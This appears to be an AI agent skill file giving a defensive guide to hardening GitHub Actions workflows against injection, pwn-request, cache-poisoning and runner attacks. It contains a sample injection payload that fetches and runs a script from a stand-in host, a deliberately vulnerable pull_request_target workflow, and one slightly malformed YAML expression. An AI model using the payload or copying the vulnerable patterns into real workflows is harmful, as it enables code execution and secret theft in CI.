---
name: github-actions-hardening
description: Harden GitHub Actions workflows against supply-chain and injection attacks - pin actions to commit SHAs, least-privilege permissions blocks, OIDC instead of long-lived secrets, script injection from github.event context in run blocks, pull_request_target and untrusted PR code, artifact and cache poisoning, and self-hosted runner escape. Use when writing or reviewing a workflow, when setting up secrets or cloud auth in CI, when a workflow runs on pull_request, or when someone reports an Actions security warning or a compromised action. Triggers on "GitHub Actions security", "pin action to SHA", "script injection", "pull_request_target", "permissions", "OIDC", "self-hosted runner", "workflow security", "pwn request".
compatibility: GitHub Actions workflow syntax and security model. Verify action versions and SHA pins with the registry or `gh api` before use; pin inputs are action-specific.
metadata:
  version: "1.0"
---

# GitHub Actions Hardening

Default posture: **a workflow is a program running with your repository's
credentials on someone else's runner.** Treat it with the suspicion you would
give a dependency that runs at install time — because that is exactly what it
is.

## The seven rules

1. **Pin every third-party action to a full commit SHA**, not a tag.
2. **Declare `permissions:` explicitly** at the workflow level, as small as
   possible, and narrow further per job.
3. **Use OIDC** for cloud auth; avoid long-lived secrets.
4. **Never interpolate untrusted context into a `run:` block.** Use an
   environment variable.
5. **Never run untrusted PR code in a privileged context**
   (`pull_request_target`, `workflow_run`, `issue_comment`).
6. **Treat artifacts and caches from untrusted runs as untrusted inputs.**
7. **Self-hosted runners in a public repo are remote code execution for anyone
   who can open a PR.**

## 1. Pin actions to SHAs

```yaml
# Bad: a mutable tag. The owner can repoint it, and tags have been repointed.
- uses: actions/checkout@v4
- uses: some-org/some-action@main

# Good: a full 40-character SHA, with the version in a comment for humans.
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
- uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0
```

Resolving a SHA:

```bash
gh api repos/actions/checkout/git/ref/tags/v4.2.2 --jq '.object.sha'
# Annotated tags: peel to the commit.
gh api repos/actions/checkout/git/tags/v4.2.2 --jq '.object.sha'
# Dependabot keeps the pins updated if you enable it:
#   .github/dependabot.yml -> package-ecosystem: "github-actions"
```

Use only actions you would trust with your CI credentials: first-party
(`actions/*`, `github/*`) or ones whose source you have read. Third-party
actions frequently contain a post-install step that is not visible in the YAML.

## 2. Least-privilege permissions

The default token permissions depend on repository settings, which you should
not have to look up. Declare them:

```yaml
permissions:            # workflow level: the floor for every job
  contents: read
jobs:
  test:
    permissions:
      contents: read    # job level: this job's actual needs
  release:
    needs: [test]
    permissions:
      contents: write
      packages: write
      id-token: write  # only if using OIDC
```

- `contents: read` is what almost every job needs. `contents: write` is what
  most compromised workflows steal.
- `id-token: write` is only for OIDC; never combine it with untrusted input in
  the same job.
- `pull-requests: write` lets a job comment on PRs — needed by review bots and
  by release-please, and a juicy target.
- Set the **repository default** to read-only under Settings → Actions → Workflow
  permissions. Then a workflow that forgets `permissions:` is safe by default.
- Third-party actions inherit the job's token. `permissions: {}` (empty) for a
  job that only runs linting with third-party actions is the right answer.

## 3. OIDC instead of long-lived secrets

Every stored cloud credential is a permanent liability: it does not expire, it
is not tied to a repo or a branch, and it appears in every job that uses it.
OIDC issues a short-lived token per job, tied to the repo, the ref, and the
workflow.

```yaml
permissions:
  id-token: write
  contents: read
steps:
  - uses: aws-actions/configure-aws-credentials@<sha>   # pin; verify the major
    with:
      role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
      aws-region: eu-west-1
  # No AWS_ACCESS_KEY_ID secret anywhere. The token lives ~15 minutes.
```

The cloud provider side must **trust the GitHub OIDC issuer with a subject
condition** — this is the part people skip, and skipping it means any workflow in
any repo can claim your role:

```json
{
  "Condition": {
    "StringEquals": { "token.actions.githubusercontent.com:aud": "sts.amazonaws.com" },
    "StringLike": { "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:ref:refs/heads/main" }
  }
}
```

Restrict the `sub` to the exact repo **and** the exact ref or environment. A
condition of `"repo:myorg/*"` lets any repo in your org assume the role.

Same pattern for GCP (Workload Identity Federation) and Azure (OIDC federated
credential). Deploy via GitHub **Environments** with required reviewers for
anything that writes to production: the environment's protection rules gate the
job regardless of what the workflow says.

## 4. Script injection: the highest-severity local finding

**Any untrusted context interpolated directly into `run:` is a shell injection.**
Untrusted contexts include `github.event.issue.title`, `github.event.*.body`,
`github.event.pull_request.title`, `github.event.comment.body`, branch names
(from forks), commit messages, and anything an external user can set.

```yaml
# Vulnerable: a PR titled "; curl evil.sh | sh; #" executes on the runner.
- run: echo "Fixing ${{ github.event.pull_request.title }}"

# Safe: the value goes through the environment, and the shell treats it as data.
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    set -euo pipefail
    printf 'Fixing %s\n' "$PR_TITLE"
```

- **`env:` is the fix**, not "quote it" — `${{ }}` is substituted *before* the
  shell parses the line, so quotes around it do not help. Once it is in `env`,
  `"$VAR"` is a variable expansion and cannot be reparsed as syntax.
- Never build a shell command from an untrusted value, even with
  `printf %q` gymnastics. Use an array, or pass it as an argument.
- For `actions/github-script` and `actions/first-interaction`, the same rule:
  the interpolation is into generated JavaScript. Use `context.payload` and read
  fields in JS rather than interpolating them.
- Also avoid interpolating into `if:` conditions and into action inputs that
  execute code (e.g. a test-runner action that takes a `test-name` argument and
  runs it through a shell).

## 5. Untrusted PR code: `pull_request_target`

`pull_request` runs the workflow from the **merge commit of the PR branch**,
with a read-only token and no access to secrets — safe. But
`pull_request_target` runs from the **base branch** (trusted code) with a
**read-write token and access to all secrets** — while checking out and running
the PR's code. That combination is the "pwn request" pattern.

```yaml
# Vulnerable: PR code runs with all secrets.
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@<sha>
        with: { ref: ${{ github.event.pull_request.head.sha } }}  # attacker's code
      - run: ./build.sh                                        # ...with secrets
        env:
          AWS_SECRET: ${{ secrets.AWS_SECRET }}
```

Rules:

- **`pull_request_target` must never build, test, or run code from the PR.** If
  you need it (to comment on a PR, to label it, to run a privileged action like
  a deploy approval), do *not* check out `head.sha` and do not execute anything
  derived from the PR. Use `github.event.pull_request.head.label`/`head.ref`
  only as data.
- **To run a privileged job on a fork's code**: two workflows. The unprivileged
  `pull_request` workflow builds the artifact and uploads it as an artifact; the
  privileged `workflow_run` workflow (triggered on the first workflow's
  completion) downloads the artifact and deploys it. The `workflow_run` handler
  must check out the **base** branch and treat the artifact as untrusted input
  — validate it (e.g. verify a signature or a checksum committed on the base
  branch) before executing.
- **`workflow_run` has the same trap**: it runs in the base context with secrets
  and the artifacts of whatever triggered it, including from forks. Guard it:
  `if: github.event.workflow_run.event == 'pull_request' && github.event.workflow_run.conclusion == 'success'`,
  and do not run the downloaded code with secrets without validating it.
- **Issues and comments** are attacker-controlled. An `issue_comment` workflow
  that checks out `${{ github.event.issue.pull_request.head.sha }}` or that
  parses the comment body into a command is remote code execution. A bot that
  reads `/deploy production` from a comment must authorise the commenter
  (`github.event.comment.user.type == 'User'` and a permission check) and must
  not interpolate the body into `run:`.
- **Fork PRs get a read-only token and no secrets** by design. A workflow that
  "needs" secrets on a fork PR is misdesigned; the fix is not `pull_request_target`.

## 6. Artifacts and caches are untrusted inputs

- **Anything a `pull_request` workflow produces is attacker-controlled**: build
  outputs, test reports, coverage files, uploaded archives, caches. A privileged
  downstream job that *executes* one of these is running the PR's code with
  production credentials.
- **Do not consume `pull_request_target`/`workflow_run` artifacts as
  executable** without validation: verify a checksum or signature produced by a
  trusted job, or rebuild from source in the trusted context.
- **Caches are shared across branches** and survive runs. A PR that populates a
  cache with a malicious `node_modules` (or a poisoned `~/.cache`) can affect
  main. Scope caches per branch/PR for anything that is later executed, and
  never restore a cache in a privileged job that was written by an untrusted
  one. (`ci-caching-and-speedup` covers the result-caching trap from the other
  side.)
- **Code scanning / SARIF uploads** from a fork are untrusted input to whatever
  consumes them.
- **Docker**: `docker build` on PR code, then pushing that image anywhere, is
  publishing attacker-controlled content. Build on PRs but do not push to a
  registry that privileged jobs pull from; or push to an isolated registry
  namespace that nothing deploys from.

## 7. Self-hosted runners

A self-hosted runner executes arbitrary code from anyone who can open a pull
request against the repo. If the runner is on your network or in your cloud
account, that is a lateral-movement path.

- **Never use self-hosted runners on public repositories** with
  `pull_request`-triggered workflows. Use GitHub-hosted runners, or restrict
  workflows to run self-hosted only on `push` to a protected branch.
- **Ephemeral runners only** for untrusted code: one job per runner, destroyed
  afterwards. A persistent runner accumulates credentials, Docker images, and
  workspace files from every job it has ever run.
- **Run untrusted jobs in a sandbox**: a container or VM with no access to the
  host network, no cloud instance metadata, no host Docker socket. Mounting the
  Docker socket into a runner container is equivalent to giving root on the host.
- **Isolate by repo**: a runner group per repository or trust level, not shared
  across repos with different trust.
- **Do not use privileged mode** (`--privileged`) for untrusted jobs.
- Rotate anything a persistent runner ever touched. Treat a runner that ran
  fork code as potentially compromised.

## Other hardening

- **`concurrency` with `cancel-in-progress`** on branches saves minutes and
  stops duplicate deploys from racing.
- **Set `timeout-minutes` on every job** so a hang does not burn the quota.
- **Environment protection for production**: required reviewers, a wait timer,
  and secrets scoped to the environment rather than the repository.
- **Restrict which environments a job can use**, and gate deploys on the
  environment so a fork PR cannot reach the production secrets at all.
- **Third-party actions are dependencies**: review them, prefer 1–3 lines over a
  large composite action, and pin. Actions run with the job's token and can read
  the workspace.
- **Use `github.actor` and `github.triggering_actor` correctly**: `actor` is who
  initiated the run (possibly a rerun by someone else). For authorisation, check
  permissions, not the actor's name.
- **Protect the `GITHUB_TOKEN` from being exfiltrated** by a `pull_request` job:
  a `run:` step that prints `${{ secrets.GITHUB_TOKEN }}` or writes it to a log
  is fine only because the token is read-only on PRs — but the same step on
  `push` is a leak. Never echo secrets; mask and rely on the runner's masking.
- **`workflow` permissions and YAML injection via `pull_request` title in a
  `run:`** — covered above; the two interact, so fix the injection first.

## Gotchas

- **`permissions:` at the workflow level is overridden by the job level, not
  merged.** Setting `contents: write` at the workflow top does not grant it to a
  job that declares its own block without it. Write the block at both levels
  deliberately.
- **`secrets` are not available to workflows triggered by a fork's
  `pull_request`** — but they *are* available on `pull_request_target` and
  `workflow_run`. The fix is never "pass secrets to the trusted context and
  run PR code in it".
- **SHA pins get stale and fail closed.** A pinned action that no longer exists
  at that SHA fails the workflow, which is the safe failure. Enable Dependabot
  for `github-actions` so the pins are updated.
- **`github.event.pull_request.head.ref` on a fork is the fork's branch name,
  which can contain a `/` and a `-`** and looks like a path. Do not use it in
  paths; use `head.label` or the numeric `head.repo.id`.
- **`secrets.GITHUB_TOKEN` is per-run and expires**, but any other secret you
  store does not. Rotate long-lived secrets and prefer OIDC.
- **A `if: always()` cleanup step still has access to secrets**; make sure the
  cleanup command is not built from event data.
- **Composite actions run in the caller's context** with the caller's token and
  secrets. A "trusted" local composite action that interpolates event data into
  a `run:` has the same injection hole as a remote one.
- **`pull_request` on a private repo from a branch in the same repo** *does* get
  access to secrets (the code is trusted — it is your branch). Do not use that
  as a security boundary; it is a convenience.
- **Environment secrets vs repository secrets:** move production credentials to
  environment secrets. A repository secret is available to *every* workflow,
  including one a dependency's action could hijack.
- **Self-hosted runners cache `~/.docker` and the workspace between jobs.** A
  later job can read what an earlier one left, including an untrusted PR's
  output. Ephemeral runners or explicit cleanup between jobs.

## Files

- `references/secure-workflow-yaml.md` — annotated before/after workflows: a
  hardened PR pipeline, a privileged post-merge deploy with OIDC, and the
  artifacts-between-workflows pattern. Read it when writing or reviewing a
  workflow file.
